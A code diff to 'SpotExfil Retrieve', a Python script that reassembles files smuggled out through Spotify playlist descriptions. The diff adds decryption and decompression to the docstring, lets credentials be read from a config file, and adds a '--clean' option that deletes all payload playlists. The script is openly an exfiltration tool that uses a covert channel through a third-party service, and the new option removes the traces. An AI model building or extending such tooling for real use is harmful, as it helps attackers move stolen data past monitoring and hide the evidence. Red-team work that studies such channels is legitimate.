@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
 """SpotExfil Retrieve - Retrieve exfiltrated data from Spotify playlists.
 
-Reads payload chunks from playlist descriptions, decodes (and optionally
-decrypts) them back to the original file.
+Reads payload chunks from playlist descriptions, decodes, decrypts,
+and decompresses them back to the original file.
 
-Pre-requisites:
-    Environment variables:
-        SPOTIFY_USERNAME, SPOTIFY_CLIENT_ID,
-        SPOTIFY_CLIENT_SECRET, SPOTIFY_REDIRECTURI
+Credentials can be provided via environment variables or
+~/.spotexfil.conf config file.
 """
 
 import argparse
@@ -26,14 +24,19 @@ def parse_args():
     """Parse command-line arguments.
 
     Returns:
-        argparse.Namespace with 'receive', optional 'key' and 'output'.
+        argparse.Namespace with parsed arguments.
     """
     parser = argparse.ArgumentParser(
         description='SpotExfil: retrieve data from Spotify playlists'
     )
-    parser.add_argument(
-        '-r', '--receive', action='store_true', required=True,
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument(
+        '-r', '--receive', action='store_true',
         help='Retrieve and decode the payload'
+    )
+    group.add_argument(
+        '--clean', action='store_true',
+        help='Remove all payload playlists and exit'
     )
     parser.add_argument(
         '-k', '--key', default=None,
@@ -51,6 +54,11 @@ def main():
     args = parse_args()
 
     spotify = spot.Spot()
+
+    if args.clean:
+        spotify.clear_data()
+        return
+
     cipher = encoding.Subcipher(spotify, encryption_key=args.key)
 
     results = spotify.retrieve_playlists()
